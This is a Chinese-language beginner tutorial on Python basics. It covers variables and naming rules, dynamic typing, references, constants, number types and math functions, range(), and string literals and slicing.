<blockquote>
<p><font face="Comic sans MS">我们添加了一个名为message的<strong>变量</strong>。每个变量都存储了一个<strong>值</strong>——与变量相关联的信息。在这里，存储的值为文本“Hello Python world!”。</font></p>
</blockquote>
<br>

<p><font face="Comic sans MS"><strong>多个变量赋值：</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line"><span class="comment">#以上实例，创建一个整型对象，值为1，三个变量被分配到相同的内存空间上。</span></span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS">或者</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;john&quot;</span></span><br><span class="line"><span class="comment">#以上实例，两个整型对象 1 和 2 分别分配给变量 a 和 b，字符串对象 &quot;john&quot; 分配给变量 c。</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>三、变量的命名和使用</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>请务必牢记下述有关变量的规则：</strong></font></p>
</blockquote>
<ol>
<li><font face="Comic sans MS">变量名只能包含<font color="#FF7F00"><strong>字母、数字</strong>和<strong>下划线</strong></font>。变量名可以字母或下划线打头，但不能以数字打头，例如，可将变量命名为message_1，但不能将其命名为1_message。 </font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>变量名不能包含空格</strong></font>，但可使用下划线来分隔其中的单词。例如，变量名greeting_message可行，但变量名greeting message会引发错误。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>不要将Python关键字和函数名用作变量名</strong></font>，即不要使用Python保留用于特殊用途的单词，如print。</font></li>
<li><font face="Comic sans MS">变量名应既简短又具有描述性。例如，name比n好，student_name比s_n好，name_length比length_of_persons_name好。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>慎用小写字母l和大写字母O</strong></font>，因为它们可能被人错看成数字1和0。</font></li>
<li><font face="Comic sans MS">注意：就目前而言，<font color="#FF7F00"><strong>应使用小写的Python变量名</strong></font>。在变量名中使用大写字母虽然不会导致错误，但避免使用大写字母是个不错的主意。</font></li>
</ol>
<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>四、变量是一种动态语言</strong></font><br>&amp;emsp;<br>代码示例：<br><font color="#00B2EE"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a = <span class="number">123</span> <span class="comment"># a是整数</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = <span class="string">&#x27;ABC&#x27;</span> <span class="comment"># a变为字符串</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">123</span> </span><br><span class="line">ABC</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS">这种变量本身类型不固定的语言称之为<font color="red"><strong>动态语言</strong></font>，与之对应的是<font color="red"><strong>静态语言</strong></font>。和静态语言相比，<strong>动态语言更灵活</strong>，就是这个原因。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下（&#x2F;&#x2F; 表示注释）：</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>; <span class="comment">// a是整数类型变量</span></span><br><span class="line">a = <span class="string">&quot;ABC&quot;</span>; <span class="comment">// 错误：不能把字符串赋给整型变量</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>五、Python的变量是Python的指针</strong></font> </p>
<p>可参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/hzwsj/p/5777973.html">一切都是对象，一切都是指针，一切都是东西（python的编程哲学）</a>]</font><br>&amp;emsp;<br>如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">5</span></span><br><span class="line">a=<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line"><span class="number">1769134320</span> </span><br><span class="line"><span class="number">1769134320</span> </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS">我们分别查一下他们的内存地址，发现地址是一样的。</font></p>
<blockquote>
<p><font face="Comic sans MS"><strong>于是我们可以这样理解：</strong></font></p>
</blockquote>
<ol>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>python把一切数据，一切的一切都看作对象，在python中，没有变量，只有指针，要说变量，也是指针变量</strong></font>。</font></li>
<li><font face="Comic sans MS">这样的变量还有如：<strong>列表</strong>，<strong>字典的值</strong>。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>但是字符串，数字等类型的变量，字典的键就是传值使用，不是指针，而是不可再改变的值</strong></font>。</font></li>
</ol>
<p>&amp;emsp;<br><strong>举例子</strong><br><font color="#00B2EE">例子1：</font>当我们写：<br><font color="#00B2EE"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;ABC&#x27;</span></span><br></pre></td></tr></table></figure>


<p><font face="Comic sans MS">时，Python解释器干了两件事情：</font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">在内存中创建了一个’ABC’的字符串；</font></li>
<li><font face="Comic sans MS">在内存中创建了一个名为a的变量，<strong>并把它指向’ABC’</strong></font></li>
</ol>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE">例子2：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line">b = a</span><br><span class="line">a = <span class="string">&#x27;XYZ&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">ABC </span><br></pre></td></tr></table></figure>

<br>

<p><font face="Comic sans MS">最后一行打印出变量b的内容到底是**<code>&#39;ABC&#39;</code><strong>呢还是</strong><code>&#39;XYZ&#39;</code><strong>？如果从数学意义上理解，就会错误地得出</strong><code>b</code><strong>和</strong><code>a</code><strong>相同，也应该是</strong><code>&#39;XYZ&#39;</code><strong>，但实际上</strong><code>b</code><strong>的值是</strong><code>&#39;ABC&#39;</code>**，让我们一行一行地执行代码，就可以看到到底发生了什么事：</font></p>
<ol>
<li><font face="Comic sans MS">执行a &#x3D; ‘ABC’，解释器创建了字符串’ABC’和变量a，**并把a指向’ABC’**：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c760234f3b42.png" alt="1.png"></p>
<ol start="2">
<li><font face="Comic sans MS">执行b &#x3D; a，解释器创建了变量b，并把b指向a指向的字符串’ABC’：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7602fa3c6f7.png" alt="0 (1).png"></p>
<ol start="3">
<li><font face="Comic sans MS">执行a &#x3D; ‘XYZ’，解释器创建了字符串’XYZ’，并把a的指向改为’XYZ’，但b并没有更改：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7603411d5fc.png" alt="0 (2).png"></p>
<p><font face="Comic sans MS">所以，最后打印变量b的结果自然是’ABC’了。</font></p>
<br>
&emsp;

<h3 id="二-常量"><a href="#二-常量" class="headerlink" title="二. 常量"></a><font color="#FF6347" face="Comic sans MS">二. 常量</font></h3><p><font face="Comic sans MS">所谓常量就是不能变的变量，比如常用的数学常数π就是一个常量。在Python中，<strong>通常用全部大写的变量名表示常量</strong>：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PI = <span class="number">3.14159265359</span></span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="#FF7F00"><strong>但事实上PI仍然是一个变量，Python根本没有任何机制保证PI不会被改变</strong></font>，所以，用全部大写的变量名表示常量只是一个习惯上的用法，如果你一定要改变变量PI的值，也没人能拦住你。</font></p>
<p><font color="#FF7F00"></font></p>
<h3 id="三-数据类型"><a href="#三-数据类型" class="headerlink" title="三. 数据类型"></a><font color="#FF6347" face="Comic sans MS">三. 数据类型</font></h3><p><font face="Comic sans MS"><strong>标准数据类型</strong></p>
<p>在内存中存储的数据可以有多种类型。</p>
<p>Python 定义了一些标准类型，用于存储各种类型的数据。</font></p>
<blockquote>
<p><font face="Comic sans MS">Python<font color="#FF7F00"><strong>有五个标准</strong></font>的数据类型：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">Numbers（数字）</font></li>
<li><font face="Microsoft YaHei">String（字符串）</font></li>
<li><font face="Sans-serif">List（列表）</font></li>
<li><font face="Sans-serif">Tuple（元组）</font></li>
<li><font face="Sans-serif">Dictionary（字典）</font></li>
</ol>
<h4 id="3-1-数字运算和函数"><a href="#3-1-数字运算和函数" class="headerlink" title="3.1 数字运算和函数"></a><font color="#3CB371" face="Comic sans MS">3.1 数字运算和函数</font></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>一、整数的定义和基础知识</strong></font> </p>
<ol>
<li><p><font face="Comic sans MS"><font color="#FF7F00"><strong>Python可以处理任意大小的整数，当然包括负整数</strong></font>，在程序中的表示方法和数学上的写法一模一样，例如：1，100，-8080，0，等等。</font></p>
</li>
<li><p><font face="Comic sans MS">计算机由于使用二进制，所以，有时候用<font color="#FF7F00"><strong>十六进制表示整数</strong></font>比较方便，十六进制用0x前缀和0-9，a-f表示，例如：0xff00，0xa5b4c3d2，等等。</font></p>
</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、整数运算</strong></font> </p>
<p><font face="Comic sans MS">在Python中，可对整数执行加（**<code>+</code><strong>）减（</strong><code>-</code><strong>）乘（</strong><code>*</code><strong>）除（</strong><code>/</code>**）平方（<code>**</code>）取余（<code>%</code>）运算。</font></p>
<br>

<p><font face="Comic sans MS"><font color="red"><strong>注意事项：</strong></font> </font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">Python使用<font color="#FF7F00"><strong>两个乘号表示乘方运算：</strong></font><code>3 ** 2==9</code></font></li>
<li><font face="Comic sans MS">Python<font color="#FF7F00"><strong>整数的除法得到的结果是精确的</strong></font>。在Python中，有两种除法：</font><ol>
<li><font face="Comic sans MS">一种除法是<code>/</code>(结果是浮点数)</font></li>
<li><font face="Comic sans MS">另一种是除法是<code>//</code>，称为地板除(两个整数的除法仍然是整数) </font></li>
</ol>
</li>
<li><font face="Comic sans MS">因为**<code>//</code>**除法只取结果的整数部分，所以Python还提供一个余数运算(<code>%</code>)，可以得到两个整数相除的余数。</font></li>
</ol>
</blockquote>
<p>&amp;emsp;<br>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span>/<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a=<span class="number">10</span>//<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a=<span class="number">10</span>%<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运算结果：</span><br><span class="line"><span class="number">3.3333333333333335</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">1</span> </span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、Number 类型转换</strong></font> </p>
<p>||<br>:-|:-|<br>int(x [,base ])         |将x转换为一个整数<br>long(x [,base ])        |将x转换为一个长整数<br>float(x )               |将x转换到一个浮点数<br>complex(real [,imag ])  |创建一个复数<br>str(x )                 |将对象 x 转换为字符串<br>repr(x )                |将对象 x 转换为表达式字符串<br>eval(str )              |用来计算在字符串中的有效Python表达式,并返回一个对象<br>tuple(s )               |将序列 s 转换为一个元组<br>list(s )                |将序列 s 转换为一个列表<br>chr(x )                 |将一个整数转换为一个字符<br>unichr(x )              |将一个整数转换为Unicode字符<br>ord(x )                 |将一个字符转换为它的整数值<br>hex(x )                 |将一个整数转换为一个十六进制字符串<br>oct(x )                 |将一个整数转换为一个八进制字符串  </p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>四、数学函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">返回值 ( 描述 )</th>
</tr>
</thead>
<tbody><tr>
<td align="left">abs(x)</td>
<td align="left">返回数字的绝对值，如abs(-10) 返回 10</td>
</tr>
<tr>
<td align="left">ceil(x)</td>
<td align="left">返回数字的上入整数，如math.ceil(4.1) 返回 5</td>
</tr>
<tr>
<td align="left">cmp(x, y)</td>
<td align="left">如果 x &lt; y 返回 -1, 如果 x &#x3D;&#x3D; y 返回 0, 如果 x &gt; y 返回 1</td>
</tr>
<tr>
<td align="left">exp(x)</td>
<td align="left">返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td>
</tr>
<tr>
<td align="left">fabs(x)</td>
<td align="left">返回数字的绝对值，如math.fabs(-10) 返回10.0</td>
</tr>
<tr>
<td align="left">floor(x)</td>
<td align="left">返回数字的下舍整数，如math.floor(4.9)返回 4</td>
</tr>
<tr>
<td align="left">log(x)</td>
<td align="left">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td>
</tr>
<tr>
<td align="left">log10(x)</td>
<td align="left">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td>
</tr>
<tr>
<td align="left">max(x1, x2,…)</td>
<td align="left">返回给定参数的最大值，参数可以为序列。</td>
</tr>
<tr>
<td align="left">min(x1, x2,…)</td>
<td align="left">返回给定参数的最小值，参数可以为序列。</td>
</tr>
<tr>
<td align="left">modf(x)</td>
<td align="left">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td>
</tr>
<tr>
<td align="left">pow(x, y)</td>
<td align="left">x**y 运算后的值。</td>
</tr>
<tr>
<td align="left">round(x [,n])</td>
<td align="left">返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。</td>
</tr>
<tr>
<td align="left">sqrt(x)</td>
<td align="left">返回数字x的平方根</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>五、随机数函数</strong></font> </p>
<p><font face="Comic sans MS">随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。</font></p>
<p>Python包含以下常用随机数函数：</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">choice(seq)</td>
<td align="left">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，<br>从0到9中随机挑选一个整数。</td>
</tr>
<tr>
<td align="left">randrange</td>
<td align="left">([start,] stop [,step])    从指定范围内，按指定基数递增的集合中获取一个随机数，<br>基数缺省值为1</td>
</tr>
<tr>
<td align="left">random()</td>
<td align="left">随机生成下一个实数，它在[0,1)范围内。</td>
</tr>
<tr>
<td align="left">seed([x])</td>
<td align="left">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，<br>Python会帮你选择seed。</td>
</tr>
<tr>
<td align="left">shuffle(lst)</td>
<td align="left">将序列的所有元素随机排序</td>
</tr>
<tr>
<td align="left">uniform(x, y)</td>
<td align="left">随机生成下一个实数，它在[x,y]范围内。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>六、三角函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">acos(x)</td>
<td align="left">返回x的反余弦弧度值。</td>
</tr>
<tr>
<td align="left">asin(x)</td>
<td align="left">返回x的反正弦弧度值。</td>
</tr>
<tr>
<td align="left">atan(x)</td>
<td align="left">返回x的反正切弧度值。</td>
</tr>
<tr>
<td align="left">atan2(y, x)</td>
<td align="left">返回给定的 X 及 Y 坐标值的反正切值。</td>
</tr>
<tr>
<td align="left">cos(x)</td>
<td align="left">返回x的弧度的余弦值。</td>
</tr>
<tr>
<td align="left">hypot(x, y)</td>
<td align="left">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td>
</tr>
<tr>
<td align="left">sin(x)</td>
<td align="left">返回的x弧度的正弦值。</td>
</tr>
<tr>
<td align="left">tan(x)</td>
<td align="left">返回x弧度的正切值。</td>
</tr>
<tr>
<td align="left">degrees(x)</td>
<td align="left">将弧度转换为角度,如degrees(math.pi&#x2F;2) ， 返回90.0</td>
</tr>
<tr>
<td align="left">radians(x)</td>
<td align="left">将角度转换为弧度</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>七、数学常量</strong></font></p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pi</td>
<td align="left">数学常量 pi（圆周率，一般以π来表示）</td>
</tr>
<tr>
<td align="left">e</td>
<td align="left">数学常量 e，e即自然常数（自然常数）。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>八、 range()函数</strong><br></font></p>
<p><font face="Comic sans MS">Python3 range() 函数返回的是一个可迭代对象（类型是对象），而不是列表类型， 所以打印的时候不会打印列表。<br></font></p>
<p><font face="Comic sans MS">Python3 list() 函数是对象迭代器，可以把range()返回的可迭代对象转为一个列表，返回的变量类型为列表。<br></font></p>
<p><font face="Comic sans MS">Python2 range() 函数返回的是列表。<br></font></p>
<p><font face="Comic sans MS"><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-built-in-functions.html">Python3 内置函数</a>]</font></font>&amp;emsp;<font face="Comic sans MS"><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-func-range.html">Python3 range() 函数用法</a>]</font><br></font></p>
<br>

<p><strong>函数语法：</strong><br><font color="#FF7F00"><strong>range(stop)</strong></font><br><font color="#FF7F00"><strong>range(start, stop[, step])</strong></font></p>
<br>

<blockquote>
<p><strong>参数说明：</strong><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>start:</strong></font> 计数从 start开始。默认是从 0 开始。例如range（5）等价于range（0， 5）;</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>stop:</strong></font> 计数到 stop 结束，但不包括 stop。例如：range（0， 5） 是[0, 1, 2, 3, 4]没有5</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>step：</strong></font>步长，默认为1。例如：range（0， 5） 等价于 range(0, 5, 1)</font></p>
</blockquote>
<br>

<br>

<h4 id="3-2-浮点数"><a href="#3-2-浮点数" class="headerlink" title="3.2 浮点数"></a><font color="#3CB371" face="Comic sans MS">3.2 浮点数</font></h4><ol>
<li><p><font face="Comic sans MS">浮点数也就是小数，之所以称为浮点数，<strong>是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的</strong>，比如，1.23x10^9和12.3x10^8是完全相等的。浮点数可以用数学写法，如**<code>1.23</code><strong>，</strong><code>3.14</code><strong>，</strong><code>-9.01</code><strong>，等等。但是对于很大或很小的浮点数，就必须用科学计数法表示，</strong>把10用e替代<strong>，1.23x109就是</strong><code>1.23e9</code><strong>，或者</strong><code>12.3e8</code><strong>，0.000012可以写成</strong><code>1.2e-5</code>**，等等。</font></p>
</li>
<li><p><font face="Comic sans MS">整数和浮点数在计算机内部存储的方式是不同的，整数运算永远是精确的（除法难道也是精确的？是的！），而浮点数运算则可能会有四舍五入的误差。</font></p>
</li>
</ol>
<br>

<h4 id="3-3-字符串"><a href="#3-3-字符串" class="headerlink" title="3.3 字符串"></a><font color="#3CB371" face="Comic sans MS">3.3 字符串</font></h4><h5 id="1-定义字符串并输出"><a href="#1-定义字符串并输出" class="headerlink" title="1.定义字符串并输出"></a><font color="#00B2EE" face="Comic sans MS">1.定义字符串并输出</font></h5><ol>
<li><font face="Comic sans MS"><font color="red" face="Comic sans MS"><strong>区分单引号和双引号：</strong></font>字符串是以单引号**<code>&#39;</code><strong>或双引号</strong><code>&quot;</code><strong>括起来的任意文本，比如</strong><code>&#39;abc&#39;</code><strong>，</strong><code>&quot;xyz&quot;</code><strong>等等。</font><br><font face="Comic sans MS"><strong>请注意</strong>：</strong><code>&#39;&#39;</code><strong>或</strong><code>&quot;&quot;</code><strong>本身只是一种表示方式，不是字符串的一部分，因此，字符串</strong><code>&#39;abc&#39;</code><strong>只有</strong><code>a</code><strong>，</strong><code>b</code><strong>，</strong><code>c</code><strong>这3个字符。如果<code>&#39;</code>本身也是一个字符，那就可以用<code>&quot;&quot;</code>括起来，比如<code>&quot;I&#39;m OK&quot;</code>包含的字符是</strong><code>I</code><strong>，</strong><code>&#39;</code><strong>，</strong><code>m</code><strong>，</strong><code>空格</code><strong>，</strong><code>O</code><strong>，</strong><code>K</code>**这6个字符。<br>即<font color="#FF7F00"><strong>单引号要放到双引号里面，双引号要放到单引号里面</strong></font>。</font></li>
</ol>
<br>

<ol start="2">
<li><font color="red" face="Comic sans MS"><strong>使用转义字符“<code>\</code>”</strong></font> ： <font face="Microsoft YaHei">如果字符串内部既包含**<code>&#39;</code><strong>又包含</strong><code>&quot;</code><strong>怎么办？可以用转义字符</strong><code>\</code>**来标识，比如：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;I\&#x27;m \&quot;OK\&quot;!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">I<span class="string">&#x27;m &quot;OK&quot;! </span></span><br></pre></td></tr></table></figure>

<br>

<p><font face="Microsoft YaHei">把双引号括在单引号里面，但是下面的单引号必须转义，如下也是正确的：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;I\&#x27;m &quot;OK&quot;!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font color="red" face="Comic sans MS"><strong>使用不转义字符“<code>r&#39;&#39;</code>”</strong></font>： <font face="Microsoft YaHei">如果字符串里面有很多字符都需要转义，就需要加很多**<code>\</code><strong>，为了简化，Python还允许用<code>r&#39;&#39;</code>表示，<font color="#FF7F00"></strong><code>&#39;&#39;</code>内部的字符串默认不转义**</font>，可以自己试试：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;\\\t\\&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">a=<span class="string">r&#x27;\\\t\\&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">\	\ </span><br><span class="line">\\\t\\ </span><br></pre></td></tr></table></figure>


<br>

<ol start="4">
<li><font color="red" face="Comic sans MS"><strong>在字符串里面有换行，将字符串按照换行输出。使用</strong><code>&#39;&#39;&#39;  内容  &#39;&#39;&#39;</code><strong>：</strong></font><font face="Microsoft YaHei">如果字符串内部有很多换行，用**<code>\n</code><strong>写在一行里不好阅读，为了简化，Python允许用</strong><code>&#39;&#39;&#39; 这里写内容&#39;&#39;&#39;</code>**的格式表示多行内容，可以自己试试：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;&#x27;&#x27;hello</span></span><br><span class="line"><span class="string">world</span></span><br><span class="line"><span class="string">line1</span></span><br><span class="line"><span class="string">line2&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">hello </span><br><span class="line">world </span><br><span class="line">line1 </span><br><span class="line">line2 </span><br></pre></td></tr></table></figure>

<br>

<ol start="5">
<li><font color="red" face="Comic sans MS"><strong>在字符串里面有换行，将字符串按照换行输出，并且不转义输出字符。使用<code>r&#39;&#39;&#39;  &#39;&#39;&#39;</code>：</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">r&#x27;&#x27;&#x27;hello \n</span></span><br><span class="line"><span class="string">world</span></span><br><span class="line"><span class="string">line1</span></span><br><span class="line"><span class="string">line2&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">hello \n </span><br><span class="line">world </span><br><span class="line">line1 </span><br><span class="line">line2 </span><br></pre></td></tr></table></figure>


<br>

<h5 id="2-使用字符串-取下标"><a href="#2-使用字符串-取下标" class="headerlink" title="2.使用字符串(取下标)"></a><font color="#00B2EE" face="Comic sans MS">2.使用字符串(取下标)</font></h5><blockquote>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>python的字串列表有2种取值顺序:</strong></font></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">从左到右索引默认<font color="#FF7F00"><strong>0</strong></font>开始的，最大范围是字符串<strong>长度少1</strong>；</font></li>
<li><font face="Microsoft YaHei">从右到左索引默认-1开始的，最大范围是字符串开头。</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7665042686e.png" alt="python-string-slice.png"></p>
<blockquote>
<ol start="3">
<li><font face="Microsoft YaHei">如果你要实现从字符串中获取一段<strong>子字符串</strong>的话，可以使用 <font color="#FF7F00"><strong>[头下标:尾下标]</strong></font> 来截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。</font></li>
<li><font face="Microsoft YaHei"><strong><code>[头下标:尾下标]</code></strong> 获取的子字符串包含头下标的字符，但<strong>不包含尾下标的字符</strong>。</font></li>
</ol>
</blockquote>
<br>

<p>比如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">c </span><br><span class="line">bcde </span><br></pre></td></tr></table></figure>

<blockquote>
<p><font face="Microsoft YaHei">当使用以冒号**<code>:</code>**分隔的字符串，python 返回一个新的对象，结果包含了以这对偏移标识的连续的内容，左边的开始是包含了下边界。<br>上面的结果包含了 s[1] 的值 b，而取到的最大范围不包括尾下标，就是 s[5] 的值 f。</font></p>
</blockquote>
<p><img data-src="https://i.loli.net/2019/02/27/5c76663ee5909.png" alt="9aU.png"></p>
<br>

<h5 id="3-加号-星号-冒号"><a href="#3-加号-星号-冒号" class="headerlink" title="3.加号(+)星号(*)冒号(:)"></a><font color="#00B2EE" face="Comic sans MS">3.加号(+)星号(*)冒号(:)</font></h5><blockquote>
<ol>
<li><font color="#FF7F00"><strong>加号(+)：</strong></font><strong>拼接字符串；</strong></li>
<li><font color="#FF7F00"><strong>星号(*)：</strong></font><strong>重复操作；</strong></li>
<li><font color="#FF7F00"><strong>冒号(:)：</strong></font><strong>截取字符。</strong></li>
</ol>
</blockquote>
<br>

<ol>
<li><font color="red"><strong>Python使用加号（ + ）来合并字符串</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">first_name = <span class="string">&quot;ada&quot;</span></span><br><span class="line">last_name = <span class="string">&quot;lovelace&quot;</span></span><br><span class="line">full_name = first_name + <span class="string">&quot; &quot;</span> + last_name</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + full_name + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Hello, ada lovelace! </span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li><font color="red"><strong>Python使用星号（ * ）来重复字符串</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">a=<span class="built_in">str</span>*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">Hello World!Hello World! </span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font color="red"><strong>Python使用冒号（ ： ）来截取字符</strong></font></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"> </span><br><span class="line">str = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"> </span><br><span class="line">print str           # 输出完整字符串</span><br><span class="line">print str[0]        # 输出字符串中的第一个字符</span><br><span class="line">print str[2:5]      # 输出字符串中第三个至第五个之间的字符串</span><br><span class="line">print str[2:]       # 输出从第三个字符开始的字符串</span><br><span class="line">print str * 2       # 输出字符串两次</span><br><span class="line">print str + &quot;TEST&quot;  # 输出连接的字符串</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">Hello World!</span><br><span class="line">H</span><br><span class="line">llo</span><br><span class="line">llo World!</span><br><span class="line">Hello World!Hello World!</span><br><span class="line">Hello World!TEST</span><br></pre></td></tr></table></figure>


<blockquote>
<p><font face="Microsoft YaHei">Python 列表截取可以接收第三个参数，<font color="#FF7F00"><strong>参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：</strong></font></font></p>
</blockquote>
<p><img data-src="https://i.loli.net/2019/02/27/5c766ace2223e.png" alt="python_list_slice_2.png"></p>
<br>

